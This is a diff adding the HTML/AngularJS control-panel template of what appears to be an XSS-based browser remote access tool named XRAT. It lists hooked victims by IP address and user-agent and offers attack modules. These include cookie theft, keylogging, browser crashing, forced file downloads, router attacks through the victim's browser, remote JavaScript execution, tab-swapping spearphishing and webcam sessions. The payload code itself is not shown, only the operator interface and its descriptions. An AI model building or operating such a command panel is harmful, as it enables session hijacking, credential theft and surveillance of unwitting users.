@@ -1,0 +1,477 @@
+<div id="myModal" class="modal hide fade">
+  <div class="modal-header">
+    <button type="button" data-dismiss="modal" class="close">&times;</button>
+    <h3>{{modal.header}}</h3>
+  </div>
+  <div class="modal-body">
+<!--     {{modal.body}}
+ -->
+      <form class="form-horizontal">
+          <div class="control-group">
+              <label for="pollSpeedInput" class="control-label">Poll Speed (ms)</label>
+              <div class="controls">
+                  <input type="text" id="pollSpeedInput" ng-model="pollSpeedText" pattern="\d+" required placeholder="{{target.pollSpeed}}">
+              </div>
+          </div>
+      </form>
+
+  </div>
+  <div class="modal-footer">
+    <a class="btn" data-dismiss="modal">Close</a>
+    <a class="btn btn-primary" ng-click="setPollSpeed()">Save Changes</a>
+  </div>
+</div>
+
+
+
+
+
+<div class="row-fluid row" style="height:900px;">
+    <div class="span3">
+        <ul class="well fullheight nav nav-list" style="padding-left:25px;">
+            <li class="nav-header" style="font-size:13px;margin-top:10px;">Online Nodes</li>
+            <li class="divider"></li>
+
+            <li ng-repeat="node in nodes" ng-class="{active: isTarget(node)}">
+                <a ng-click="setTarget(node)">{{ node.name }}</a>
+            </li>
+
+            <li class="divider"></li>
+
+            <li class="nav-header" style="font-size:13px;margin-top:10px;">Offline Nodes</li>
+            <li class="divider"></li>
+
+        </ul>
+        <a ng-click="flush()" class="btn span10 offset1" style="padding-top:10px;padding-bottom:10px;margin-top:20px;">Flush All Nodes</a>
+    </div>
+    <div class="span9 maxheight" id="dashBigBlock">
+
+
+        <div class="page-header">
+            <h1>More Info <small>- Details for {{target.name}}</small></h1>
+        </div>
+        <div>
+            <table id="infotable" class="table table-bordered table-striped">
+                <tbody>
+                    <tr>
+                        <td>Name</td>
+                        <td><a class="icon-pencil"></a> {{target.name}}</td>
+                    </tr>
+                    <tr>
+                        <td>IP Address</td>
+                        <td>{{target.addr}}</td>
+                    </tr>
+                    <tr>
+                        <td>User-Agent</td>
+                        <td>{{target.userAgent}}</td>
+                    </tr>
+                    <tr>
+                        <td>Node ID</td>
+                        <td>{{target.cid}}</td>
+                    </tr>
+                    <tr>
+                        <td>Online</td>
+                        <td>{{target.online}}</td>
+                    </tr>
+                    <tr>
+                        <td>Away From Keyboard</td>
+                        <td>{{target.afk}}</td>
+                    </tr>
+                    <tr>
+                        <td>Hook Page:</td>
+                        <td>{{target.hookPage}}</td>
+                    </tr>
+                    <tr>
+                        <td>Hook Time:</td>
+                        <td>{{target.startTime}}</td>
+                    </tr>
+                    <tr>
+                        <td>Last Check In:</td>
+                        <td>{{target.startTime}}</td>
+                    </tr>
+                    <tr>
+                        <td>Poll Speed (ms)</td>
+                        <td><a class="icon-pencil" onclick="$('#myModal').modal();"></a> 10000</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <table class="table table-bordered table-striped">
+                <thead>
+                    <tr>
+                        <th>Note Name</th>
+                        <th>Note</th>
+                    </tr>
+                </thead>
+                <tbody>
+                </tbody>
+            </table>
+        </div>
+
+
+        <div class="page-header">
+            <h1>Module Attacks <small>- Fire Away!</small></h1>
+        </div>
+
+
+        <div class="accordion" id="accordion2">
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseOne">
+                Alert <i class="icon-warning-sign pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseOne" class="accordion-body collapse in">
+              <div class="accordion-inner">
+                <h4>Create a Simple Alert Message</h4>
+
+                <form class="form-horizontal" ng-submit="sendAlert()">
+                    <div class="control-group">
+                        <label for="alert2html" class="control-label">Message</label>
+                        <div class="controls">
+                            <textarea id="alert2html" rows="5" ng-model="alertText"></textarea>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <div class="controls">
+                            <button type="submit" class="btn btn-large btn-primary">Send the Alert</button>
+                            <a class="btn btn-large" ng-click="alertPreview()">Preview</a>
+                        </div>
+                    </div>
+                </form>
+
+              </div>
+            </div>
+          </div>
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseTwo">
+                Alert II <i class="icon-exclamation-sign pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseTwo" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>Create a more elegant popup <small> - Write your html into a twitter bootstrap modal</small></h4>
+                <p>Alert II creates what is more commonly referred to as a modal. Specifically a twitter bootstrap modal, because I'm lazy about a lot of this stuff. This modal lets you write html right into it.</p>
+
+                <form class="form-horizontal" ng-submit="sendAlert2()">
+                    <div class="control-group">
+                        <label class="control-label" for="alert2header">Header</label>
+                        <div class="controls">
+                            <input type="text" id="alert2header" placeholder="Example Header" ng-model="alert2HeaderText">
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <label for="alert2html" class="control-label">HTML</label>
+                        <div class="controls">
+                            <textarea id="alert2html" rows="15" ng-model="alert2Text"></textarea>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <div class="controls">
+                            <button type="submit" class="btn btn-large btn-primary">Send Modal</button>
+                            <a class="btn btn-large">Preview</a>
+                        </div>
+                    </div>
+                </form>
+
+              </div>
+            </div>
+          </div>
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseEighteen">
+                Blue Screen of Death <i class="icon-repeat pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseEighteen" class="accordion-body collapse">
+              <div class="accordion-inner">
+                
+                <h4>Create a fake BSOD and cause sheer terror</h4>
+
+                <p>The Bluescreen of Death module creates a realistic, animated, blue screen of death emulator that will be played in the browser. By using the fullscreen button you can get rid of the obvious url window and tabs in the browser, BUT you will most likely give them a popup asking for full screen support.</p>
+
+                <div class="btn-stack-group">
+                    
+                    <button class="btn btn-large btn-block btn-primary" type="button">Cause BSOD!</button>
+                    <button class="btn btn-large btn-block" type="button">Preview BSOD!</button>
+
+                    <div class="page-header"></div>
+
+                    <button class="btn btn-large btn-block btn-inverse" type="button">Cause Fullscreen BSOD!</button>
+                    <button class="btn btn-large btn-block" type="button">Preview Fullscreen BSOD!</button>
+                    
+                </div>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseFour">
+                Cookie Grabber <i class="icon-heart pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseFour" class="accordion-body collapse">
+              <div class="accordion-inner">
+                    <h4>Steal the cookies your victim may be using to authenticate to sites.</h4>
+                    <p>Most sites use cookies to keep a user logged in. So when we steal these cookies, we can use them to tell that site we are that user.</p>
+
+                    <div class="btn-stack-group">
+                        
+                        <button class="btn btn-large btn-block btn-primary" type="button">Steal Cookie!</button>
+                        
+                    </div>
+
+              </div>
+            </div>
+          </div>
+
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseFourteen">
+                Crash Browser <i class="icon-off pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseFourteen" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>Crash your victims browser <small> - And for some guys with IE, their OS</small></h4>
+                <p>Basically, this module runs a script that will allocate more and more memory inside of a loop untill the browser tab or the entire browser crashes. Occassionally can crash windows 7.</p>
+
+                <div class="btn-stack-group">
+                        
+                    <button class="btn btn-large btn-block btn-primary" type="button" ng-click="sendCrashBrowser()">Crash Browser!</button>
+                        
+                </div>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseFive">
+                Chat <i class="icon-comment pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseFive" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>Open up a chat session with your victim <small> - Maybe get to know em</small></h4>
+                <div class="alert alert-info fade in">
+                  <button type="button" class="close" data-dismiss="alert">×</button>
+                  <strong>Note:</strong> This module will be highly dependent on the polling speed of the victims client. Try setting it to something like 1000 milliseconds or lower for this module.
+                </div>
+                <p>Opens up a small window in the corner of your victims screen, displaying messages you've written to them as well as allowing them to send messages back.</p>
+              </div>
+            </div>
+          </div>
+
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseSix">
+                Deface <i class="icon-eye-close pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseSix" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>Vandalize your victim's current webpage</h4>
+                <p>Either replace the entire body block of html on the page, or use jQuery to target certain bits of html and change it in javascript.</p>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseSixteen">
+                Download <i class="icon-download-alt pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseSixteen" class="accordion-body collapse">
+              <div class="accordion-inner">
+                    <h4>Force your victim to download a file</h4>
+                    <p>Uses an iframe to force download a file that is being hosted on THIS SERVER. That means you're going to have to first upload that file here. There will be a file upload section soon, along with a route/controller that handles file downloads.</p>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseSeven">
+                Keylogger <i class="icon-book pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseSeven" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>Log your victim's keystrokes</h4>
+                <p>This module isn't so much a command as it is a state flag. While active, the victim will keep sending a log its keystrokes. While inactive, it won't. Simple. Keystroke logs are saved to the server.</p>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseEight">
+                PlaySound <i class="icon-play pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseEight" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>Play a sound through your victim's speakers <small> - Be the omnipotent voice-in-the-box</small></h4>
+                <p>Plays the audio from a sound file as long as you have the URL for it. When the XRAT file upload feature comes along, you'll be able to host your audio here. Also stay tuned for future updates implementing text-to-speech.</p>
+              </div>
+            </div>
+          </div>
+
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseFifteen">
+                Play Video (RickRoll) <i class="icon-play-circle pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseFifteen" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>Play any youtube video on your victim's page <small>Default Rick Astley</small></h4>
+                <p>To use this module you must provide the ID of the youtube video you wish to send to your victim. It will be at the end of youtube urls like /watch?v=oHg5SJYRHA0</p>
+
+                <form class="form-horizontal" ng-submit="sendVideo()">
+                    <div class="control-group">
+                        <label for="videoid" class="control-label">Youtube Video ID</label>
+                        <div class="controls">
+                            <input type="text" id="videoid" placeholder="oHg5SJYRHA0" ng-model="videoText">
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <div class="controls">
+                            <button type="submit" class="btn btn-large btn-primary">Send the Video</button>
+                            <a class="btn btn-large" onclick="alert('no preview atm')">Preview</a>
+                        </div>
+                    </div>
+                </form>
+
+
+              </div>
+            </div>
+          </div>
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseNine">
+                Redirect <i class="icon-globe pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseNine" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>Redirect their browser to any location on the web</h4>
+              </div>
+            </div>
+          </div>
+
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseThirteen">
+                Router Hacks <i class="icon-signal pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseThirteen" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>Get into the WLAN!</h4>
+                <p>Everyone that connects to the internet gets a public ip address. Most people's routers don't allow traffic coming into the public IP to access the web interface that controls them. This access is limited to the local network. With xss we can have our victim attack that interface on our behalf.</p>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseTen">
+                Shell <i class="icon-edit pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseTen" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>A Command Line-ish Experience</h4>
+                <p>Write some raw javascript commands and have the victim execute it and return the results. Like the Chat module, you will want to lower the victim's poll speed to a latency you are comfortable with.</p>
+              </div>
+            </div>
+          </div>
+
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseEleven">
+                Spearphishing <i class="icon-user pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseEleven" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>Targeted Phishing Attacks</h4>
+                <p>These phishing attacks can either be fairly obvious or somewhat stealthy. You can immediately redirect your victims to these pages. Or you could instruct the script to wait for them to switch to another tab and then change the page and tab title to the phishing page.</p>
+                <p>As development on XRAT progresses more and more phishing pages will be built. Future pages will include Google, Facebook, Yahoo, and Bank phishing pages. Also hope to have the gmail notification popup included.</p>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseTwelve">
+                WebCam <i class="icon-facetime-video pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseTwelve" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>Open up a WebRTC video session.</h4> 
+                <p>Because it is WebRTC it will only work in browsers that support it. Also might require permission taken on behalf of the user.</p>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseSeventeen">
+                Window Effects <i class="icon-fire pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseSeventeen" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <div class="page-header"><h4>Apply Some Cool Effects</h4>
+                <p>Now they truly tremble at your awesome abilities my lord. Watch them cower as you send fire down upon their browser and shake their screen like an earthquake!</p></div>
+                
+
+                <h4>EarthQuake</h4>
+                <p>This effect shakes the users screen according to some settings that you can specify.</p>
+
+
+
+                <h4>Snowflakes</h4>
+                <p>This effect caues snowflakes to fall across the users screen according to some settings that you can specify.</p>
+              </div>
+
+
+            </div>
+          </div>
+
+
+
+    </div>
+</div>
